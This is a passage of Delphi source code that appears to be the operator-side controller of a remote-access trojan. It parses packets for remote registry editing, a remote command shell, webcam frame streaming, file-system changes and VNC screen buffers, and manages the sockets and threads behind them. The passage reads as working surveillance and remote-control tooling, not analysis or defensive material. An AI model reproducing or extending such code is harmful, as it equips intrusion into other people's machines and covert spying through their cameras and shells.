    begin
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        AddRegKeys;
      end;
      tmpString := 'Registrykeys received!';
      SetRegManagerStatus;
    end;
    PACK_ENUMVALUES:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        AddRegValues;
      end;
      tmpString := 'Registryvalues received!';
      SetRegManagerStatus;
    end;
    PACK_REGADD:
    begin
      if sString = '1' then
        tmpString := 'Registrykey added!'
      else
        tmpString := 'Couldnt add Registrykey!';
      SetRegManagerStatus;
    end;
    PACK_REGDELETE:
    begin
      if sString = '1' then
        tmpString := 'Registrykey deleted!'
      else
        tmpString := 'Cant delete Registrykey!';
      SetRegManagerStatus;
    end;
    PACK_REGRENAME:
    begin
      if sString = '1' then
        tmpString := 'Registrykey renamed!'
      else
        tmpString := 'Cant rename Registrykey!';
      SetRegManagerStatus;
    end;
    PACK_SHELLSTART:
    begin
      ManageShell(True);
      tmpString := 'Shell started!';
      SetRemoteShellStatus;
    end;
    PACK_SHELLSTOP:
    begin
      ManageShell(False);
      tmpString := 'Shell closed!';
      SetRemoteShellStatus;
    end;
    PACK_SHELLDATA:
    begin
      tmpString := sString;
      Synchronize(AddShellOutput);
      tmpString := 'Data received!';
      SetRemoteShellStatus;
    end;
    PACK_CAMSOCKET:
    begin
      SocketType := SOCK_CAM;
      myInfos.lSocketID := StrToInt(sString);
      myInfos.lDownloadID := 0;
      idJob := GET_SOCKETINFO;
      Synchronize(DoSyncJob);
      if mSocketInfos <> nil then begin
        with mSocketInfos.fControl.mCam do begin
          sCamSocket := mySocket;
          stat1.Panels.Items[0].Text := 'Connected!';
          FormShow(nil);
        end;
      end else
        closeSocket(mySocket);
    end;
    PACK_GETCAMLIST:
    begin
      if mSocketInfos <> nil then
      begin
        mSocketInfos.fControl.mCam.cbb1.Clear;
        pStrList := Explode('|',sString);
        if pStrList.Count <> 0 then begin
          for lCounter := 0 to pStrList.Count - 1 do
            mSocketInfos.fControl.mCam.cbb1.Items.Add(pStrList.Strings[lCounter]);
          mSocketInfos.fControl.mCam.stat1.Panels.Items[0].Text := 'List received!';
        end else
          mSocketInfos.fControl.mCam.stat1.Panels.Items[0].Text := 'No cams aviable!';
      end;
    end;
    PACK_STARTCAM:
    begin
      if Assigned(tempStream) = false then
        tempStream := TMemoryStream.Create;
      if Assigned(jpgCam) = false then
        jpgCam := TJPEGImage.Create;
      if mSocketInfos <> nil then
      begin
        if sString = '1' then begin
          mSocketInfos.fControl.mCam.stat1.Panels.Items[0].Text := 'Cam started!';
          mSocketInfos.fControl.mCam.RequestImage;
        end else begin
          mSocketInfos.fControl.mCam.stat1.Panels.Items[0].Text := 'Cant start cam!';
          mSocketInfos.fControl.mCam.btn1.Down := False;
          mSocketInfos.fControl.mCam.RequestImage;
        end;
      end;
    end;
    PACK_CAMDATA:
    begin
        tempStream.Clear;
        tempStream.Write(sString[1],Length(sString));
        myInfos.lReceivedSize := tempStream.Size;
        tempStream.Seek(0, soFromBeginning);
        jpgCam.LoadFromStream(tempStream);
        Synchronize(ReceiveCam);
        //Free and Clear
        mSocketInfos.fControl.mCam.RequestImage;
    end;
    PACK_SHORTCUT:
    begin
      if assigned(fControl) then begin
        fControl.edtPath.text := sString;
        fControl.MenuItem1Click(nil);
      end;
    end;
    PACK_DIRCREATE:
    begin
      if sString = '1' then
        tmpString := 'Directory created successfully!'
      else
        tmpString := 'Couldnt create directory!';
      idJob := SET_FILEMANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_DIRDELETE:
    begin
      if sString = '1' then
        tmpString := 'Directory deleted successfully!'
      else
        tmpString := 'Couldnt delete directory!';
      idJob := SET_FILEMANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_DIRRENAME:
    begin
      if sString = '1' then
        tmpString := 'Directory renamed successfully!'
      else
        tmpString := 'Couldnt rename directory!';
      idJob := SET_FILEMANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
  end;
end;

function TClientThread.GetPacket(sSocket:integer; sPass:String):String;
var
  bArr:array[0..4095] of Byte;
  bByte:Byte;
  tempStr, sData:String;
  dwLen:Integer;
  dwPacketSize, dwRealLen:Cardinal;
  pPointer:Pointer;
begin
  repeat
    ZeroMemory(@barr[0],4096);
    dwLen := recv(sSocket,bArr[0],4096,0);
    if (dwLen <= 0) then break;
    SetLength(tempStr,dwLen);
    MoveMemory(@tempStr[1],@bArr[0],dwLen);
    sData := sData + tempStr;
    if SocketType = SOCK_TRANSFER then begin
      if (mSocketInfos <> nil) then begin
        myInfos.lReceivedSize := Length(sData);
        Synchronize(UpdateTransferListItem);
      end;
    end;
    repeat
      pPointer := @sData[1];
      dwPacketSize := LPSocketHeader(pPointer)^.dwPackLen;
      dwRealLen := Length(sData) - SizeOf(TCustomPacketHeader);
      If dwPacketSize <= dwRealLen then begin
        bByte := LPSocketHeader(pPointer)^.bPackType;
        Delete(sData,1,SizeOf(TCustomPacketHeader));
        tempStr := copy(sData,1,dwPacketSize);
        Delete(sData,1,dwPacketSize);
        ParseCommand(sSocket,bByte,tempStr);
        tempStr := '';
      end else break;
    until sData = '';
  until 1 = 3;
end;

function TClientThread.SendData(bCommand:Byte; sString:String):Boolean;
begin
  mCriticalSection.Enter;
  try
    Result := SendPacket(mySocket,bCommand,sString);
  finally
    mCriticalSection.Leave;
  end;
end;

procedure TClientThread.Execute;
begin
  GetPacket(mySocket,'a');
end;

constructor TClientThread.Create(CreateSuspended: Boolean);
begin
  inherited;
  mCriticalSection := TCriticalSection.Create;
  mySocket := 0;
  FreeOnTerminate := True;
  OnTerminate := Termination;
end;

procedure TClientThread.SetSocket(iSock:Integer);
begin
  mySocket := iSock;
end;

procedure TClientThread.Termination(Sender: TObject);
var
  i:Integer;
  fList:TList;
begin
  Synchronize(DeleteListItem);
  try
    fList := Form1.CenterList.LockList;
    for I := 0 to fList.Count - 1 do begin
      if TSocketInfo(fList.Items[i]).lSocketID = mySocket then begin
        fList.Delete(i);
        break;
      end;
    end;
  finally
    Form1.CenterList.UnlockList;
  end;

  try
    mCriticalSection.Destroy;
    if Assigned(fControl) then
      fControl.Free;
    if Assigned(tempStream) then
      tempStream.Free;
    if Assigned(streamVNCFull) then
      streamVNCFull.Free;
    if Assigned(streamPartial) then
      streamPartial.Free;
    if Assigned(streamDone) then
      streamDone.Free;
  except
    //NO ERROR HANDLING NEEDED!
  end;
end;

end.

